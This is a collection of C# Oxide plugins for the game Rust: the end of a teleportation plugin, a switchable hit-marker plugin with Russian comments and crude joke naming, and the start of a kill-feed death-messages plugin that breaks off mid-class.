            if (player.GetParentEntity() is JunkPile)
            {
                return true;
            }

            RaycastHit hit;
            if (Physics.Raycast(player.transform.position + new Vector3(0f, 0.5f, 0f), Vector3.down, out hit, 3f, Layers.Mask.World, QueryTriggerInteraction.Ignore))
            {
                return hit.GetEntity() is JunkPile;
            }

            return false;
        }

        private Vector3 GetGroundBuilding(Vector3 sourcePos)
        {
            sourcePos.y = TerrainMeta.HeightMap.GetHeight(sourcePos);
            RaycastHit hitinfo;
            if (Physics.Raycast(sourcePos, Vector3.down, out hitinfo, Layers.Mask.Terrain | Layers.Mask.World | Layers.Mask.Construction | Layers.Mask.Deployed))
            {
                sourcePos.y = Mathf.Max(hitinfo.point.y, sourcePos.y);
                return sourcePos;
            }
            if (Physics.Raycast(sourcePos, Vector3.up, out hitinfo, Layers.Mask.Terrain | Layers.Mask.World | Layers.Mask.Construction | Layers.Mask.Deployed))
                sourcePos.y = Mathf.Max(hitinfo.point.y, sourcePos.y);
            return sourcePos;
        }

        private bool UnderneathFoundation(Vector3 position)
        {
            RaycastHit hit;
            if (Physics.Raycast(position + new Vector3(0f, 3f, 0f), Vector3.down, out hit, 5f, Layers.Mask.Construction, QueryTriggerInteraction.Ignore))
            {
                var block = hit.GetEntity() as BuildingBlock;

                if (block.IsValid() && (block.prefabID == 72949757 || block.prefabID == 3234260181))
                {
                    return hit.point.y > position.y;
                }
            }
            return false;
        }

        private bool IsAllowed(BasePlayer player, string perm = null)
        {
            var playerAuthLevel = player.net?.connection?.authLevel;

            int requiredAuthLevel = 3;
            if (config.Admin.UseableByModerators)
            {
                requiredAuthLevel = 1;
            }
            else if (config.Admin.UseableByAdmins)
            {
                requiredAuthLevel = 2;
            }
            if (playerAuthLevel >= requiredAuthLevel) return true;

            return !string.IsNullOrEmpty(perm) && permission.UserHasPermission(player.UserIDString, perm);
        }

        private bool IsAllowedMsg(BasePlayer player, string perm = null)
        {
            if (IsAllowed(player, perm)) return true;
            PrintMsgL(player, "NotAllowed");
            return false;
        }

        private Effect reusableSoundEffectInstance = new Effect();

        private void SendEffect(BasePlayer player, string sound = null)
        {
            if (config.Settings.PlaySounds && config.Settings.PrefabSounds.Count != 0)
            {
                if (string.IsNullOrEmpty(sound)) sound = config.Settings.PrefabSounds.GetRandom();

                reusableSoundEffectInstance.Init(Effect.Type.Generic, player, 0, Vector3.zero, Vector3.forward);
                reusableSoundEffectInstance.pooledString = sound;

                EffectNetwork.Send(reusableSoundEffectInstance, player.Connection);
            }
        }

        private int GetHigher(BasePlayer player, Dictionary<string, int> limits, int limit, bool unlimited)
        {
            if (unlimited && limit == 0) return limit;

            foreach (var l in limits)
            {
                if (permission.UserHasPermission(player.UserIDString, l.Key))
                {
                    if (unlimited && l.Value == 0) return l.Value;

                    limit = Math.Max(l.Value, limit);
                }
            }
            return limit;
        }

        private int GetLower(BasePlayer player, Dictionary<string, int> times, int time)
        {
            foreach (var l in times)
            {
                if (permission.UserHasPermission(player.UserIDString, l.Key))
                {
                    time = Math.Min(l.Value, time);
                }
            }
            return time;
        }

        private void CheckPerms(Dictionary<string, int> limits)
        {
            foreach (var limit in limits)
            {
                if (!permission.PermissionExists(limit.Key))
                {
                    permission.RegisterPermission(limit.Key, this);
                }
            }
        }
        #endregion

        #region Message
        private string _(string msgId, BasePlayer player, params object[] args)
        {
            var msg = lang.GetMessage(msgId, this, player?.UserIDString);
            return args.Length > 0 ? string.Format(msg, args) : msg;
        }

        private void PrintMsgL(IPlayer user, string msgId, params object[] args)
        {
            if (user.IsServer)
            {
                user.Reply(string.Format(lang.GetMessage(msgId, this, user.Id), args));
            }
            else PrintMsgL(user.Object as BasePlayer, msgId, args);
        }

        private void PrintMsgL(BasePlayer player, string msgId, params object[] args)
        {
            if (player == null) return;
            PrintMsg(player, _(msgId, player, args));
        }

        private void PrintMsg(BasePlayer player, string message)
        {
            if (player == null || string.IsNullOrEmpty(message)) return;
            if (config.Settings.UsePopup)
            {
                PopupNotifications?.Call("CreatePopupNotification", config.Settings.ChatName + message, player);
            }
            else Player.Message(player, $"{config.Settings.ChatName}{message}", config.Settings.ChatID);
        }

        #endregion

        #region DrawBox
        private static void DrawBox(BasePlayer player, Vector3 center, Quaternion rotation, Vector3 size)
        {
            size /= 2;
            var point1 = RotatePointAroundPivot(new Vector3(center.x + size.x, center.y + size.y, center.z + size.z), center, rotation);
            var point2 = RotatePointAroundPivot(new Vector3(center.x + size.x, center.y - size.y, center.z + size.z), center, rotation);
            var point3 = RotatePointAroundPivot(new Vector3(center.x + size.x, center.y + size.y, center.z - size.z), center, rotation);
            var point4 = RotatePointAroundPivot(new Vector3(center.x + size.x, center.y - size.y, center.z - size.z), center, rotation);
            var point5 = RotatePointAroundPivot(new Vector3(center.x - size.x, center.y + size.y, center.z + size.z), center, rotation);
            var point6 = RotatePointAroundPivot(new Vector3(center.x - size.x, center.y - size.y, center.z + size.z), center, rotation);
            var point7 = RotatePointAroundPivot(new Vector3(center.x - size.x, center.y + size.y, center.z - size.z), center, rotation);
            var point8 = RotatePointAroundPivot(new Vector3(center.x - size.x, center.y - size.y, center.z - size.z), center, rotation);

            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point1, point2);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point1, point3);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point1, point5);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point4, point2);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point4, point3);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point4, point8);

            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point5, point6);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point5, point7);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point6, point2);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point8, point6);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point8, point7);
            player.SendConsoleCommand("ddraw.line", 30f, Color.blue, point7, point3);
        }

        private static Vector3 RotatePointAroundPivot(Vector3 point, Vector3 pivot, Quaternion rotation)
        {
            return rotation * (point - pivot) + pivot;
        }
        #endregion

        #region FindPlayer
        private ulong FindPlayersSingleId(string nameOrIdOrIp, BasePlayer player)
        {
            var targets = FindPlayers(nameOrIdOrIp, true);
            if (targets.Count > 1)
            {
                PrintMsgL(player, "MultiplePlayers", GetMultiplePlayers(targets));
                return 0;
            }
            ulong userId;
            if (targets.Count <= 0)
            {
                if (ulong.TryParse(nameOrIdOrIp, out userId)) return userId;
                PrintMsgL(player, "PlayerNotFound");
                return 0;
            }
            else
                userId = targets.First().userID;

            return userId;
        }

        private BasePlayer FindPlayersSingle(string value, BasePlayer player)
        {
            if (string.IsNullOrEmpty(value)) return null;
            BasePlayer target;
            if (_ids.TryGetValue(value, out target) && target.IsValid())
            {
                return target;
            }
            var targets = FindPlayers(value, true);
            if (targets.Count <= 0)
            {
                PrintMsgL(player, "PlayerNotFound");
                return null;
            }
            if (targets.Count > 1)
            {
                PrintMsgL(player, "MultiplePlayers", GetMultiplePlayers(targets));
                return null;
            }

            return targets.First();
        }

        private List<BasePlayer> FindPlayers(string arg, bool all = false)
        {
            var players = new List<BasePlayer>();

            if (string.IsNullOrEmpty(arg))
            {
                return players;
            }

            BasePlayer target;
            if (_ids.TryGetValue(arg, out target) && target.IsValid())
            {
                if (all || target.IsConnected)
                {
                    players.Add(target);
                    return players;
                }
            }

            foreach (var user in all ? BasePlayer.allPlayerList : BasePlayer.activePlayerList)
            {
                if (user == null || string.IsNullOrEmpty(user.displayName) || players.Contains(user))
                {
                    continue;
                }

                if (user.UserIDString == arg || user.displayName.Contains(arg, CompareOptions.OrdinalIgnoreCase))
                {
                    players.Add(user);
                }
            }

            return players;
        }
        #endregion

        #region API
        private Dictionary<string, Vector3> GetHomes(object playerObj)
        {
            if (playerObj == null) return null;
            if (playerObj is string) playerObj = Convert.ToUInt64(playerObj);
            if (!(playerObj is ulong)) throw new ArgumentException("playerObj");
            var playerId = (ulong)playerObj;
            HomeData homeData;
            if (!_Home.TryGetValue(playerId, out homeData) || homeData.Locations.Count == 0) return null;
            return homeData.Locations;
        }

        #endregion

        private class UnityVector3Converter : JsonConverter
        {
            public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)
            {
                var vector = (Vector3)value;
                writer.WriteValue($"{vector.x} {vector.y} {vector.z}");
            }

            public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
            {
                if (reader.TokenType == JsonToken.String)
                {
                    var values = reader.Value.ToString().Trim().Split(' ');
                    return new Vector3(Convert.ToSingle(values[0]), Convert.ToSingle(values[1]), Convert.ToSingle(values[2]));
                }
                var o = JObject.Load(reader);
                return new Vector3(Convert.ToSingle(o["x"]), Convert.ToSingle(o["y"]), Convert.ToSingle(o["z"]));
            }

            public override bool CanConvert(Type objectType)
            {
                return objectType == typeof(Vector3);
            }
        }

        private class CustomComparerDictionaryCreationConverter<T> : CustomCreationConverter<IDictionary>
        {
            private readonly IEqualityComparer<T> comparer;

            public CustomComparerDictionaryCreationConverter(IEqualityComparer<T> comparer)
            {
                if (comparer == null)
                    throw new ArgumentNullException(nameof(comparer));
                this.comparer = comparer;
            }

            public override bool CanConvert(Type objectType)
            {
                return HasCompatibleInterface(objectType) && HasCompatibleConstructor(objectType);
            }

            private static bool HasCompatibleInterface(Type objectType)
            {
                return objectType.GetInterfaces().Where(i => HasGenericTypeDefinition(i, typeof(IDictionary<,>))).Any(i => typeof(T).IsAssignableFrom(i.GetGenericArguments().First()));
            }

            private static bool HasGenericTypeDefinition(Type objectType, Type typeDefinition)
            {
                return objectType.GetTypeInfo().IsGenericType && objectType.GetGenericTypeDefinition() == typeDefinition;
            }

            private static bool HasCompatibleConstructor(Type objectType)
            {
                return objectType.GetConstructor(new[] { typeof(IEqualityComparer<T>) }) != null;
            }

            public override IDictionary Create(Type objectType)
            {
                return Activator.CreateInstance(objectType, comparer) as IDictionary;
            }
        }

        [HookMethod("SendHelpText")]
        private void SendHelpText(BasePlayer player)
        {
            PrintMsgL(player, "<size=14>NTeleportation</size> by <color=#ce422b>Nogrod</color>\n<color=#ffd479>/sethome NAME</color> - Set home on current foundation\n<color=#ffd479>/home NAME</color> - Go to one of your homes\n<color=#ffd479>/home list</color> - List your homes\n<color=#ffd479>/town</color> - Go to town, if set\n/tpb - Go back to previous location\n/tpr PLAYER - Request teleport to PLAYER\n/tpa - Accept teleport request");
        }

        private bool API_HavePendingRequest(BasePlayer player)
        {
            return PendingRequests.ContainsKey(player.userID) || PlayersRequests.ContainsKey(player.userID) || TeleportTimers.ContainsKey(player.userID);
        }

        private bool API_HaveAvailableHomes(BasePlayer player)
        {
            HomeData homeData;
            if (!_Home.TryGetValue(player.userID, out homeData))
            {
                _Home[player.userID] = homeData = new HomeData();
            }

            var limit = GetHigher(player, config.Home.VIPHomesLimits, config.Home.HomesLimit, true);

            if (limit == 0) return true;

            return homeData.Locations.Count < limit;
        }

        private List<string> API_GetHomes(BasePlayer player)
        {
            HomeData homeData;
            if (!_Home.TryGetValue(player.userID, out homeData))
            {
                _Home[player.userID] = homeData = new HomeData();
            }

            return homeData.Locations.Keys.ToList();
        }

        private List<Vector3> API_GetLocations(string command)
        {
            var settings = GetSettings(command);

            if (settings == null)
            {
                return new List<Vector3>();
            }

            return settings.Locations;
        }

        private Dictionary<string, List<Vector3>> API_GetAllLocations()
        {
            var dict = new Dictionary<string, List<Vector3>>();

            foreach (var dc in config.DynamicCommands)
            {
                dict[dc.Key] = dc.Value.Locations;
            }

            return dict;
        }
        
        private int GetLimitRemaining(BasePlayer player, string type)
        {
            if (player == null || string.IsNullOrEmpty(type)) return -1;
            var settings = GetSettings(type, player.userID);
            if (settings == null) return -1;
            var currentDate = DateTime.Now.ToString("d");
            var limit = GetHigher(player, settings.VIPDailyLimits, settings.DailyLimit, true);
            TeleportData data;
            if (!settings.Teleports.TPData.TryGetValue(player.userID, out data))
            {
                settings.Teleports.TPData[player.userID] = data = new TeleportData();
            }
            if (data.Date != currentDate)
            {
                data.Amount = 0;
                data.Date = currentDate;
            }            
            if (limit > 0)
            {
                return limit - data.Amount;
            }
            return 0;
        }
        
        private int GetCooldownRemaining(BasePlayer player, string type)
        {
            if (player == null || string.IsNullOrEmpty(type)) return -1;
            var settings = GetSettings(type, player.userID);
            if (settings == null) return -1;
            var currentDate = DateTime.Now.ToString("d");
            var timestamp = Facepunch.Math.Epoch.Current;
            var cooldown = GetLower(player, settings.VIPCooldowns, settings.Cooldown);
            TeleportData data;
            if (!settings.Teleports.TPData.TryGetValue(player.userID, out data))
            {
                settings.Teleports.TPData[player.userID] = data = new TeleportData();
            }
            if (data.Date != currentDate)
            {
                data.Amount = 0;
                data.Date = currentDate;
            }
            if (cooldown > 0 && timestamp - data.Timestamp < cooldown)
            {
                return cooldown - (timestamp - data.Timestamp);
            }
            return 0;
        }

        private int GetCountdownRemaining(BasePlayer player, string type)
        {
            if (player == null || string.IsNullOrEmpty(type))
            {
                return -1;
            }

            TownSettings settings = GetSettings(type, player.userID);
            if (settings == null)
            {
                return -1;
            }

            return GetLower(player, settings.VIPCountdowns, settings.Countdown);
        }
    }
}


###ПЛАГИН НА ХИТМАРКЕРЫ КОТОРЫЕ МОГУТ МЕНЯТСЯ КОМАНДОЙ###


using Oxide.Game.Rust.Cui;
using System.Collections.Generic;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Core.Configuration;
using Newtonsoft.Json;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("HitMarkerManager", "ANUS", "1.0.1")]
    class HitMarkerManager : RustPlugin
    {
        private DynamicConfigFile playerDataFile;
        private Dictionary<ulong, string> playerData;

        private ConfigData _config;

        public class ConfigData
        {
            [JsonProperty("Использовать иконку попадания: ")]
            public bool UseHit = true;

            [JsonProperty("Через сколько пропадет маркер: ")]
            public float TimeToDestroy = 1.0f;

            [JsonProperty("Цвет которым отмечаются друзья: ")]
            public string ColorToFriend = "#9ACD32";

            public static ConfigData GetNewCong()
            {
                ConfigData newConfig = new ConfigData();
                newConfig.UseHit = true;
                newConfig.TimeToDestroy = 1.0f;
                newConfig.ColorToFriend = "#9ACD32";
                return newConfig;
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                _config = Config.ReadObject<ConfigData>();
            }
            catch
            {
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig() => _config = ConfigData.GetNewCong();
        protected override void SaveConfig() => Config.WriteObject(_config);

        [PluginReference] private Plugin ImageLibrary;

        Dictionary<string, string> Images = new Dictionary<string, string>()
        {
            { "hitmarker.kill", "https://i.ibb.co/zScNXXv/image-1.png&" },
            { "hitmarker.hit.normal", "https://i.ibb.co/8dWMJjc/image11111111.png&" },
            { "hitmarker.hit.wound", "https://i.imgur.com/ZjLZmzu.png" },
        };

        void Init()
        {
            playerDataFile = Interface.Oxide.DataFileSystem.GetFile("HitMarkerManager");
            LoadData();
        }

        void OnServerInitialized()
        {
            LoadImages();
            foreach (var player in BasePlayer.activePlayerList)
            {
                ApplyHitMarkerSettings(player);
            }
            InitializeLang();
        }

        void OnPlayerInit(BasePlayer player)
        {
            ApplyHitMarkerSettings(player);
        }

        [ChatCommand("hit")]
        void ToggleHitMarker(BasePlayer player, string command, string[] args)
        {
            ulong playerId = player.userID;
            if (playerData.ContainsKey(playerId) && playerData[playerId] == "XHitMarker")
            {
                playerData[playerId] = "AnusMarker";
                EnableAnusMarker(player);
                DisableXHitMarker(player);
                SendReply(player, "Ти сминил хитмаркер на анус");
            }
            else
            {
                playerData[playerId] = "XHitMarker";
                EnableXHitMarker(player);
                DisableAnusMarker(player);
                SendReply(player, "Ти сминил на циферки маркер");
            }

            SaveData();
        }

        void ApplyHitMarkerSettings(BasePlayer player)
        {
            ulong playerId = player.userID;
            if (playerData.ContainsKey(playerId))
            {
                if (playerData[playerId] == "XHitMarker")
                {
                    EnableXHitMarker(player);
                    DisableAnusMarker(player);
                }
                else
                {
                    EnableAnusMarker(player);
                    DisableXHitMarker(player);
                }
            }
            else
            {
                playerData[playerId] = "AnusMarker";
                EnableAnusMarker(player);
                DisableXHitMarker(player);
                SaveData();
            }
        }

        void EnableXHitMarker(BasePlayer player)
        {
            
        }

        void DisableXHitMarker(BasePlayer player)
        {
            
        }

        void EnableAnusMarker(BasePlayer player)
        {
            
        }

        void DisableAnusMarker(BasePlayer player)
        {
            
        }

        void LoadData()
        {
            try
            {
                playerData = playerDataFile.ReadObject<Dictionary<ulong, string>>();
            }
            catch
            {
                playerData = new Dictionary<ulong, string>();
            }
        }

        void SaveData()
        {
            playerDataFile.WriteObject(playerData);
        }

        void LoadImages()
        {
            foreach (var imgKey in Images)
            {
                ImageLibrary.Call("AddImage", imgKey.Value, imgKey.Key);
            }
        }

        private void OnPlayerAttack(BasePlayer attacker, HitInfo info)
        {
            ulong playerId = attacker.userID;
            if (playerData.ContainsKey(playerId) && playerData[playerId] == "XHitMarker")
            {
                XHitMarker_OnPlayerAttack(attacker, info);
            }
            else
            {
                AnusMarker_OnPlayerAttack(attacker, info);
            }
        }

        private void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            ulong playerId = (info?.Initiator as BasePlayer)?.userID ?? 0;
            if (playerId == 0 || !playerData.ContainsKey(playerId)) return;

            if (playerData[playerId] == "XHitMarker")
            {
                
            }
            else
            {
                AnusMarker_OnEntityDeath(entity, info);
            }
        }

        private void OnPlayerWound(BasePlayer player)
        {
            ulong playerId = (player?.lastAttacker as BasePlayer)?.userID ?? 0;
            if (playerId == 0 || !playerData.ContainsKey(playerId)) return;

            if (playerData[playerId] == "XHitMarker")
            {
                
            }
            else
            {
                AnusMarker_OnPlayerWound(player);
            }
        }

        // AnusMarker methods
        private void AnusMarker_OnPlayerAttack(BasePlayer attacker, HitInfo info)
        {
            BaseEntity entity = info.HitEntity;

            if (entity == null || !(entity is BasePlayer)) return;

            NextTick(() =>
            {
                BasePlayer victim = entity as BasePlayer;
                if (victim.IsDead() || victim.IsWounded()) return;
                if (attacker.currentTeam == victim.currentTeam && attacker.currentTeam != 0)
                {
                    HitGUI(attacker, $"<color={_config.ColorToFriend}>{victim.displayName}</color>");
                }
                else if (info.isHeadshot)
                {
                    HitGUI(attacker, $"<color=#ffffff>{info.damageTypes.Total().ToString("F0")}</color>");
                    HitPng(attacker, "hitmarker.hit.normal", "255 0 0 0.5");
                }
                else
                {
                    HitGUI(attacker, info.damageTypes.Total().ToString("F0"));
                    HitPng(attacker, "hitmarker.hit.normal", "1 1 1 0.5");
                }
            });
        }

        private void AnusMarker_OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            var player = entity.ToPlayer();
            if (player == null) return;
            var attacker = info?.Initiator as BasePlayer;
            if (attacker == null) return;
            bool check = false;
            if (info.isHeadshot)
                check = true;
            CuiHelper.DestroyUi(attacker, "normalhit");
            HitPng(attacker, "hitmarker.kill", check == true ? "1 0 0 0.6" : "1 1 1 0.6");
        }

        private void AnusMarker_OnPlayerWound(BasePlayer player)
        {
            var attacker = player?.lastAttacker as BasePlayer;
            if (attacker == null) return;
            CuiHelper.DestroyUi(attacker, "normalhit");
            HitPng(attacker, "hitmarker.hit.wound", "1 1 1 0.6");
        }

        private void HitGUI(BasePlayer attacker, string text)
        {
            CuiHelper.DestroyUi(attacker, "normalhit");
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiElement
            {
                Parent = "Hud",
                Name = "normalhit",
                FadeOut = 0.05f,
                Components =
                {
                    new CuiTextComponent { Text = text, Align = TextAnchor.MiddleCenter, FontSize = 12, Font = "RobotoCondensed-Regular.ttf", FadeIn = 0.1f },
                    new CuiRectTransformComponent { AnchorMin = $"0.5 0.5", AnchorMax = $"0.5 0.5", OffsetMin = "-100 -35", OffsetMax = "100 -5" },
                    new CuiOutlineComponent { Color = "0 0 0 0", Distance = "0.15 0.15" }
                }
            });

            CuiHelper.AddUi(attacker, container);
            attacker.Invoke(() => CuiHelper.DestroyUi(attacker, "normalhit"), _config.TimeToDestroy);
        }

        private void HitPng(BasePlayer attacker, string png, string check)
        {
            CuiHelper.DestroyUi(attacker, "hitpng");
            CuiElementContainer container = new CuiElementContainer();
            string ID = CuiHelper.GetGuid().ToString();
            string offmax = "25 20";
            string offmin = "-25 -20";
            float Fade = 0.3f;
            if (png == "hitmarker.hit.normal")
            {
                offmax = "13 13";
                offmin = "-13 -13";
                Fade = 0.1f;
                if (!_config.UseHit)
                    return;
            }
            container.Add(new CuiElement
            {
                Parent = "Hud",
                Name = "hitpng",
                FadeOut = Fade,
                Components =
                {
                    new CuiRawImageComponent { Png = (string)ImageLibrary.Call("GetImage", png), Color = check },
                    new CuiRectTransformComponent { AnchorMin = $"0.5 0.5", AnchorMax = $"0.5 0.5", OffsetMin = offmin, OffsetMax = offmax }
                }
            });

            CuiHelper.AddUi(attacker, container);
            attacker.Invoke(() => CuiHelper.DestroyUi(attacker, "hitpng"), _config.TimeToDestroy);
        }

        // XHitMarker methods
        private void XHitMarker_OnPlayerAttack(BasePlayer attacker, HitInfo info)
        {
            BaseEntity entity = info.HitEntity;

            if (entity == null || !(entity is BasePlayer)) return;

            NextTick(() =>
            {
                BasePlayer victim = entity as BasePlayer;

                if (attacker.currentTeam == victim.currentTeam && attacker.currentTeam != 0)
                    XHitMarker_HitGUI(attacker, lang.GetMessage("FRIEND", this, attacker.UserIDString));
                else if (victim.IsDead())
                    XHitMarker_HitGUI(attacker, lang.GetMessage("DEAD", this, attacker.UserIDString));
                else if (victim.IsWounded())
                    XHitMarker_HitGUI(attacker, lang.GetMessage("WOUNDED", this, attacker.UserIDString));
                else if (info.isHeadshot)
                    XHitMarker_HitGUI(attacker, $"<color=#c45c6a>-{info.damageTypes.Total().ToString("F0")}</color>");
                else
                    XHitMarker_HitGUI(attacker, "-" + info.damageTypes.Total().ToString("F0"));
            });
        }

        private void XHitMarker_HitGUI(BasePlayer attacker, string text)
        {
            CuiElementContainer container = new CuiElementContainer();

            float x = (float)Core.Random.Range(0.475, 0.525), y = (float)Core.Random.Range(0.375, 0.425);
            string ID = CuiHelper.GetGuid().ToString();

            container.Add(new CuiElement
            {
                Parent = "Hud",
                Name = ID,
                FadeOut = 0.5f,
                Components =
                {
                    new CuiTextComponent { Text = text, Align = TextAnchor.MiddleCenter, FontSize = 13, FadeIn = 0.5f },
                    new CuiRectTransformComponent { AnchorMin = $"{x} {y}", AnchorMax = $"{x} {y}", OffsetMin = "-27.5 -12.5", OffsetMax = "27.5 12.5" },
                    new CuiOutlineComponent { Color = "0 0 0 1", Distance = "0.15 0.15" }
                }
            });

            CuiHelper.AddUi(attacker, container);
            attacker.Invoke(() => CuiHelper.DestroyUi(attacker, ID), 0.75f);
        }

        private void InitializeLang()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["FRIEND"] = "<color=#6bff72>FRIEND</color>",
                ["DEAD"] = "<color=#ff6b6b>DEAD</color>",
                ["WOUNDED"] = "<color=#ffb86b>WOUNDED</color>"
            }, this);

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["FRIEND"] = "<color=#6bff72>ДРУГ</color>",
                ["DEAD"] = "<color=#ff6b6b>УБИТ</color>",
                ["WOUNDED"] = "<color=#ffb86b>УПАЛ</color>"
            }, this, "ru");
        }
    }
}


###ПЛАГИН НА УБИЙСТВА СПРАВА СВЕРХУ (ПРИМЕР (ИГРОК) УБИЛ (ИГРОКА) (ОРУЖИЕ) (М)###


using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Oxide.Plugins
{
    [Info("DeathMessages", "by Palvovv", "2.3.1")]
    class DeathMessages : RustPlugin
    {
        private static DeathMessages ins;

        private List<DeathMessage> _notes = new List<DeathMessage>();
        private Dictionary<ulong, HitInfo> _lastHits = new Dictionary<ulong, HitInfo>();

        #region Classes / Enums

        public class ColorsPrivilage
        {
            [JsonProperty("Цвет имени если игрока убили")]
            public string ColorDeath;
            [JsonProperty("Цвет имени если игрок убил")]
            public string ColorAttacker;
        }

        enum AttackerType
        {
            Player,
            Helicopter,
            Animal,
            Turret,
            Guntrap,
            Structure,
            Trap,
            Invalid,
            NPC,
            BradleyAPC,
            Zombie,
            ZombieDeath
        }

        enum VictimType
        {
            Player,
            Helicopter,
            Animal,
            Invalid,
            NPC,
            BradleyAPC,
            Zombie,
            ZombieDeath
        }

        enum DeathReason
        {
            Turret,
            Guntrap,
            Helicopter,
            HelicopterDeath,
            BradleyAPC,
            BradleyAPCDeath,
            Structure,
            Trap,
            Animal,
            AnimalDeath,
            Generic,
            Zombie,
            ZombieDeath,
            Hunger,
            Thirst,
            Cold,
            Drowned,
            Heat,
            Bleeding,
            Poison,
            Suicide,
            Bullet,
            Arrow,
            Flamethrower,
            Slash,
            Blunt,
            Fall,
            Radiation,
            Stab,
            Explosion,
            Unknown
        }

        class Attacker
        {
            public Attacker(BaseEntity entity)
            {
                Entity = entity;
                Type = InitializeType();
                Name = InitializeName();
            }

            public BaseEntity Entity { get; }

            public string Name { get; }

            public AttackerType Type { get; }

            private AttackerType InitializeType()
            {
                if (Entity == null)
                    return AttackerType.Invalid;

                if (Entity is BaseAnimalNPC)
                    return AttackerType.Animal;

                if (Entity.name.Contains("machete.weapon"))
                    return AttackerType.Zombie;

                if (Entity is NPCPlayer)
                    return AttackerType.NPC;

                if (Entity.IsNpc)
                    return AttackerType.NPC;

                if (Entity is BasePlayer)
                    return AttackerType.Player;

                if (Entity is BaseHelicopter)
                    return AttackerType.Helicopter;

                if (Entity is BradleyAPC)
                    return AttackerType.BradleyAPC;



                if (Entity.name.Contains("barricades/") || Entity.name.Contains("wall.external.high"))
                    return AttackerType.Structure;

                if (Entity.name.Contains("beartrap.prefab") || Entity.name.Contains("landmine.prefab") || Entity.name.Contains("spikes.floor.prefab"))
                    return AttackerType.Trap;

                if (Entity.name.Contains("autoturret_deployed.prefab") || Entity.name.Contains("flameturret.deployed.prefab") || Entity.name.Contains("sentry.scientist.static"))
                    return AttackerType.Turret;
                if (Entity.name.Contains("guntrap_deployed.prefab") || Entity.name.Contains("guntrap.deployed.prefab"))
                    return AttackerType.Guntrap;

                return AttackerType.Invalid;
            }

            private string InitializeName()
            {
                if (Entity == null)
                    return null;
                int name;
                switch (Type)
                {
                    case AttackerType.Player:
                        return Entity.ToPlayer().displayName;
                    case AttackerType.NPC:
                        return string.IsNullOrEmpty(Entity.ToPlayer()?.displayName) ? _config.NPCName : int.TryParse(Entity.ToPlayer().displayName, out name) ? _config.NPCName : Entity.ToPlayer().displayName + $"( {_config.NPCName})";
                    case AttackerType.Helicopter:
                        return "Patrol Helicopter";
                    case AttackerType.BradleyAPC:
                    case AttackerType.Turret:
                    case AttackerType.Guntrap:
                    case AttackerType.Trap:
                    case AttackerType.Animal:
                    case AttackerType.Structure:
                        return FormatName(Entity.name);
                }

                return string.Empty;
            }
        }

        class Victim
        {
            public Victim(BaseCombatEntity entity)
            {
                Entity = entity;
                Type = InitializeType();
                Name = InitializeName();
            }

            public BaseCombatEntity Entity { get; }

            public string Name { get; }

            public VictimType Type { get; }

            private VictimType InitializeType()
            {
                if (Entity == null)
                    return VictimType.Invalid;

                if (Entity is BaseAnimalNPC)
                    return VictimType.Animal;

                if (Entity.IsNpc)
                    return VictimType.NPC;

                if (Entity.name.Contains("machete.weapon"))
                    return VictimType.Zombie;

                if (Entity is NPCPlayer)
                    return VictimType.NPC;




                if (Entity is BasePlayer)
                    return VictimType.Player;

                if (Entity is BaseHelicopter)
                    return VictimType.Helicopter;

                if (Entity is BradleyAPC)
                    return VictimType.BradleyAPC;

                return VictimType.Invalid;
            }



            private string InitializeName()
            {
                int name;
                switch (Type)
                {
                    case VictimType.Zombie:
                        return "ZombieName";

                    case VictimType.Player:
                        return Entity.ToPlayer().displayName;

                    case VictimType.NPC:
                        return string.IsNullOrEmpty(Entity.ToPlayer()?.displayName) ? _config.NPCName : int.TryParse(Entity.ToPlayer().displayName, out name) ? _config.NPCName : Entity.ToPlayer().displayName + $" ({_config.NPCName})";

                    case VictimType.Helicopter:
                        return "Patrol Helicopter";

                    case VictimType.BradleyAPC:
                        return "BradleyAPCName";

                    case VictimType.Animal:
                        return FormatName(Entity.name);
                }
                return string.Empty;
            }
        }

        class DeathMessage
        {

            public string UINotes;

            public DeathMessage(Attacker attacker, Victim victim, string weapon, string damageType, string bodyPart, double distance)
            {
                Attacker = attacker;
                Victim = victim;
                Weapon = weapon;
                DamageType = damageType;
                BodyPart = bodyPart;
                Distance = distance;
                Reason = InitializeReason();
                Message = InitializeDeathMessage();

                if (_config.Distance <= 0)
                {
                    Players = BasePlayer.activePlayerList.ToList();
                }
                else
                {
                    var position = attacker?.Entity?.transform?.position;
                    if (position == null)
                        position = victim?.Entity?.transform?.position;

                    if (position != null)
                        Players = BasePlayer.activePlayerList.Where(x => x.Distance((UnityEngine.Vector3)position) <= _config.Distance).ToList();
                    else
                        Players = new List<BasePlayer>();
                }

                if (victim.Type == VictimType.Player && !Players.Contains(victim.Entity.ToPlayer()))
                    Players.Add(victim.Entity.ToPlayer());

                if (attacker.Type == AttackerType.Player && !Players.Contains(attacker.Entity.ToPlayer()))
                    Players.Add(attacker.Entity.ToPlayer());

                UINotes = CuiHelper.GetGuid();
            }

            public List<BasePlayer> Players { get; }

            public Attacker Attacker { get; }

            public Victim Victim { get; }

            public string Weapon { get; }

            public string BodyPart { get; }

            public string DamageType { get; }

            public double Distance { get; }

            public DeathReason Reason { get; }

            public string Message { get; }

